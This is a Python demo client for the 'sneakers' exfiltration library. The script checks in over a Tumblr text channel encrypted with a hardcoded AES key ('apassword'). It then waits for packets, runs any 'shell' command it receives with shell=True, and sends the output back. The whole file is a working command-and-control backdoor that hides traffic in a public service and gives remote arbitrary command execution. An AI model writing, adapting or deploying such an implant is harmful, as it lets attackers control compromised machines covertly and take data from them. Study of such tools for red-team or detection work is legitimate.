"""
A simple demo client.

It connects to a channel, announces it's alive, then waits for commands, printing any packets it receives and running any shell commands its told to, then returning the output of those shell commands.
"""

import json
import random
import string

from subprocess import check_output

from sneakers import Exfil

mod = "tumblr_text"

with open('sneakers/config/{}_config.json'.format(mod), 'rb') as f:
    file_data = f.read()

params = json.loads(file_data)

enc = ['aes']

t = Exfil(mod, enc)

aes_params = {'key': 'apassword'}
t.set_encoder_params('aes', {'sending': aes_params, 'receiving': aes_params})
t.set_channel_params({'sending': params, 'receiving': params})

# packet format:
# <fragment_id>|<command>|<command_data>|<command_data>|...|<response_fragment_id>

def latest_packet(packet):
    tokens = packet.split('|')
    if tokens[0] == fragment_id:
        return True
    return False

def make_fragment_id():
    return ''.join(random.choice(string.ascii_letters + string.digits) for i in range(20))

def handle_packet(packet):
    """
    Given a packet, handles it and generates a response. Expected to return
    A tuple: (data, fragment) where:
      data - response packet, minus the fragment_ids on either end.
      fragment - the fragment_id the server is expecting in our response
    """
    print("Got a packet:")
    print(packet)
    tokens = packet.split('|')
    if tokens[1] == 'shell':
        result = check_output(tokens[2], shell=True)
        response_packet = "result|{}".format(result)
    else:
        # catch-all; we didn't find any commands or anything
        response_packet = 'ack'

    fragment_id = tokens[-1]
    return (response_packet, fragment_id)

def send_data(s):
    pass

fragment_id = make_fragment_id()

# do an initial checkin
t.send("{}|connected|{}".format(make_fragment_id(), fragment_id))
while True:
    data = t.receive()
    for packet in data:
        if latest_packet(packet):
            # deal with it
            response_packet_payload, response_fragment_id = handle_packet(packet)

            # change our fragment_id so we don't see that packet again
            fragment_id = make_fragment_id()

            # send our response packet (with new fragment_id)
            response_packet = "{}|{}|{}".format(response_fragment_id, response_packet_payload, fragment_id)
            t.send(response_packet)
